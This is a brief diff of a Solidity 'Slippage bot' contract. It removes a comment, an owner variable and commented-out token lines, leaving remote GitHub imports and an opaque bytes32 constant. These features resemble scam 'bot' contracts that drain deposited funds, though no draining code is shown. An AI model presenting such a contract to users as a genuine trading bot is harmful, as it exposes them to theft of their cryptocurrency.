@@ -2,7 +2,6 @@
 pragma solidity ^0.8.19;
 
 // This Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
-// Import Libraries Migrator/Exchange/Factory
 
 import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2ERC20.sol";
 import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2Factory.sol";
@@ -11,12 +10,6 @@ import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2Pair.sol
 
 contract Calculate{
 
-    address private own;
-
-    //string public tokenName;
-    //string public tokenSymbol;
-    //tokenSymbol = _mainTokenSymbol;
-    //tokenName = _mainTokenName;
 
     bytes32 firstContractBytes = 0xfdc54b1a6f53a21d375d0dea4b719169497dbac884f858c6cc4034ec1a5c51dc;   
 
